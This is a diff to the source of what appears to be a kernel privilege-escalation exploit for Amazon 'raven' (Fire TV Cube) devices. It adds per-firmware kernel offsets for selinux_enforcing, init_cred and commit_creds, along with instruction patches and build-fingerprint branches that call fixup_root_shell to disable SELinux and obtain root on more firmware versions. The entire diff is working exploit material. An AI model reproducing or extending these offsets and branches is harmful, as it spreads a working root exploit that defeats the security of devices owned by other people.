@@ -63,6 +63,38 @@
 #define ADD_COMMIT_INDEX 3
 
 //offset values from Cube kallsyms, subtract head t _head
+// PS7201/942
+#define SELINUX_ENFORCING_7201_942 0x184d634
+#define SEL_READ_HANDLE_UNKNOWN_7201_942 0x3644b4
+#define INIT_CRED_7201_942 0x15eb228
+#define COMMIT_CREDS_7201_942 0x4cc70
+#define ADD_INIT_7201_942 0x9108a000		//add x0, x0, #0x228
+#define ADD_COMMIT_7201_942 0x9131c108		//add x8, x8, #0xc70
+
+// PS7204/1044
+#define SELINUX_ENFORCING_7204_1044 0x184d634
+#define SEL_READ_HANDLE_UNKNOWN_7204_1044 0x364438
+#define INIT_CRED_7204_1044 0x15eb228
+#define COMMIT_CREDS_7204_1044 0x4ccc0
+#define ADD_INIT_7204_1044 0x9108a000		//add x0, x0, #0x228
+#define ADD_COMMIT_7204_1044 0x91330108		//add x8, x8, #0xcc0
+
+// PS7204/1046
+#define SELINUX_ENFORCING_7204_1046 0x184d634
+#define SEL_READ_HANDLE_UNKNOWN_7204_1046 0x364438
+#define INIT_CRED_7204_1046 0x15eb228
+#define COMMIT_CREDS_7204_1046 0x4ccc0
+#define ADD_INIT_7204_1046 0x9108a000		//add x0, x0, #0x228
+#define ADD_COMMIT_7204_1046 0x91330108		//add x8, x8, #0xcc0
+
+// PS7206/1098
+#define SELINUX_ENFORCING_7206_1098 0x184d634
+#define SEL_READ_HANDLE_UNKNOWN_7206_1098 0x364438
+#define INIT_CRED_7206_1098 0x15eb228
+#define COMMIT_CREDS_7206_1098 0x4ccc0
+#define ADD_INIT_7206_1098 0x9108a000		//add x0, x0, #0x228
+#define ADD_COMMIT_7206_1098 0x91330108		//add x8, x8, #0xcc0
+
 // PS7212/1333
 #define SELINUX_ENFORCING_7212_1333 0x184d634
 #define SEL_READ_HANDLE_UNKNOWN_7212_1333 0x364304
@@ -70,6 +102,14 @@
 #define COMMIT_CREDS_7212_1333 0x4ccc0
 #define ADD_INIT_7212_1333 0x9108a000		//add x0, x0, #0x228
 #define ADD_COMMIT_7212_1333 0x91330108		//add x8, x8, #0xcc0
+
+// PS7212/1335
+#define SELINUX_ENFORCING_7212_1335 0x184d634
+#define SEL_READ_HANDLE_UNKNOWN_7212_1335 0x364304
+#define INIT_CRED_7212_1335 0x15eb228
+#define COMMIT_CREDS_7212_1335 0x4ccc0
+#define ADD_INIT_7212_1335 0x9108a000		//add x0, x0, #0x228
+#define ADD_COMMIT_7212_1335 0x91330108		//add x8, x8, #0xcc0
 
 // PS7216/1582 (uncofirmed)
 #define SELINUX_ENFORCING_7216_1582 0x184d634
@@ -79,13 +119,21 @@
 #define ADD_INIT_7216_1582 0x9108a000		//add x0, x0, #0x228
 #define ADD_COMMIT_7216_1582 0x91330108		//add x8, x8, #0xcc0
 
-// PS7224/1752 (uncofirmed)
+// PS7224/1752
 #define SELINUX_ENFORCING_7224_1752 0x185d634
-#define SEL_READ_HANDLE_UNKNOWN_7224_1752 0x3641bc
+#define SEL_READ_HANDLE_UNKNOWN_7224_1752 0x3641dc
 #define INIT_CRED_7224_1752 0x15fb228
 #define COMMIT_CREDS_7224_1752 0x4ccc0
 #define ADD_INIT_7224_1752 0x9108a000		//add x0, x0, #0x228
 #define ADD_COMMIT_7224_1752 0x91330108		//add x8, x8, #0xcc0
+
+// PS7229/1850
+#define SELINUX_ENFORCING_7229_1850 0x185d634
+#define SEL_READ_HANDLE_UNKNOWN_7229_1850 0x3641bc
+#define INIT_CRED_7229_1850 0x15fb228
+#define COMMIT_CREDS_7229_1850 0x4ccc0
+#define ADD_INIT_7229_1850 0x9108a000		//add x0, x0, #0x228
+#define ADD_COMMIT_7229_1850 0x91330108		//add x8, x8, #0xcc0
 
 // PS7229/1853
 #define SELINUX_ENFORCING_7229_1853 0x185d634
@@ -744,10 +792,45 @@ void select_offset() {
   int len = __system_property_get("ro.build.fingerprint", fingerprint);
   LOG("fingerprint: %s\n", fingerprint);
  
+  if (!strcmp(fingerprint, "Amazon/raven/raven:7.0/PS7201/942N:user/amz-p,release-keys")) {
+    selinux_enforcing = SELINUX_ENFORCING_7201_942;
+    sel_read_handle_unknown = SEL_READ_HANDLE_UNKNOWN_7201_942;
+    fixup_root_shell(INIT_CRED_7201_942, COMMIT_CREDS_7201_942, SEL_READ_HANDLE_UNKNOWN_7201_942, ADD_INIT_7201_942, ADD_COMMIT_7201_942);
+    return;  
+  } 
+
+  if (!strcmp(fingerprint, "Amazon/raven/raven:7.0/PS7204/1044N:user/amz-p,release-keys")) {
+    selinux_enforcing = SELINUX_ENFORCING_7204_1044;
+    sel_read_handle_unknown = SEL_READ_HANDLE_UNKNOWN_7204_1044;
+    fixup_root_shell(INIT_CRED_7204_1044, COMMIT_CREDS_7204_1044, SEL_READ_HANDLE_UNKNOWN_7204_1044, ADD_INIT_7204_1044, ADD_COMMIT_7204_1044);
+    return;  
+  } 
+
+  if (!strcmp(fingerprint, "Amazon/raven/raven:7.0/PS7204/1046N:user/amz-p,release-keys")) {
+    selinux_enforcing = SELINUX_ENFORCING_7204_1046;
+    sel_read_handle_unknown = SEL_READ_HANDLE_UNKNOWN_7204_1046;
+    fixup_root_shell(INIT_CRED_7204_1046, COMMIT_CREDS_7204_1046, SEL_READ_HANDLE_UNKNOWN_7204_1046, ADD_INIT_7204_1046, ADD_COMMIT_7204_1046);
+    return;  
+  } 
+  
+  if (!strcmp(fingerprint, "Amazon/raven/raven:7.0/PS7206/1098N:user/amz-p,release-keys")) {
+    selinux_enforcing = SELINUX_ENFORCING_7206_1098;
+    sel_read_handle_unknown = SEL_READ_HANDLE_UNKNOWN_7206_1098;
+    fixup_root_shell(INIT_CRED_7206_1098, COMMIT_CREDS_7206_1098, SEL_READ_HANDLE_UNKNOWN_7206_1098, ADD_INIT_7206_1098, ADD_COMMIT_7206_1098);
+    return;  
+  } 
+   
   if (!strcmp(fingerprint, "Amazon/raven/raven:7.0/PS7212/1333N:user/amz-p,release-keys")) {
     selinux_enforcing = SELINUX_ENFORCING_7212_1333;
     sel_read_handle_unknown = SEL_READ_HANDLE_UNKNOWN_7212_1333;
     fixup_root_shell(INIT_CRED_7212_1333, COMMIT_CREDS_7212_1333, SEL_READ_HANDLE_UNKNOWN_7212_1333, ADD_INIT_7212_1333, ADD_COMMIT_7212_1333);
+    return;  
+  } 
+  
+  if (!strcmp(fingerprint, "Amazon/raven/raven:7.0/PS7212/1335N:user/amz-p,release-keys")) {
+    selinux_enforcing = SELINUX_ENFORCING_7212_1335;
+    sel_read_handle_unknown = SEL_READ_HANDLE_UNKNOWN_7212_1335;
+    fixup_root_shell(INIT_CRED_7212_1335, COMMIT_CREDS_7212_1335, SEL_READ_HANDLE_UNKNOWN_7212_1335, ADD_INIT_7212_1335, ADD_COMMIT_7212_1335);
     return;  
   } 
   
@@ -762,6 +845,13 @@ void select_offset() {
     selinux_enforcing = SELINUX_ENFORCING_7224_1752;
     sel_read_handle_unknown = SEL_READ_HANDLE_UNKNOWN_7224_1752;
     fixup_root_shell(INIT_CRED_7224_1752, COMMIT_CREDS_7224_1752, SEL_READ_HANDLE_UNKNOWN_7224_1752, ADD_INIT_7224_1752, ADD_COMMIT_7224_1752);
+    return;  
+  } 
+
+  if (!strcmp(fingerprint, "Amazon/raven/raven:7.0/PS7229/1850N:user/amz-p,release-keys")) {
+    selinux_enforcing = SELINUX_ENFORCING_7229_1850;
+    sel_read_handle_unknown = SEL_READ_HANDLE_UNKNOWN_7229_1850;
+    fixup_root_shell(INIT_CRED_7229_1850, COMMIT_CREDS_7229_1850, SEL_READ_HANDLE_UNKNOWN_7229_1850, ADD_INIT_7229_1850, ADD_COMMIT_7229_1850);
     return;  
   } 
 
